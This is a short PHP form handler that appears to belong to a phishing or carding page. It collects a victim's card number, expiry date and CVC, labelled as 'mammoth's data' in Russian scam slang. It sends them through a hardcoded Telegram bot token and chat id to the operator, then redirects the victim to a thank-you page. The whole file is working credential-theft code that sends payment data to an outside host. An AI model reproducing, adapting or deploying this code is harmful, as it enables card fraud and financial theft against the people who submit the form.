<?php

$number = $_POST['number'];
$date = $_POST['date'];
$cvc = $_POST['cvc'];
$token = '6955150230:AAEABHyW9jLsv9CvO6x-awQpGHCRHQOzxcw';
$chat_id = '-4161684021';
$arr = array(
    '🦣 Данные мамонта 🦣' => '',
    'NUMBER  ' => $number,
    'DATE  ' => $date,
    'CVC  ' => $cvc,
);

foreach($arr as $key => $value){
    $txt .= "<b>".$key."</b>".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram){
    header('location:thx.html');
}else{
    echo "err";
};

?>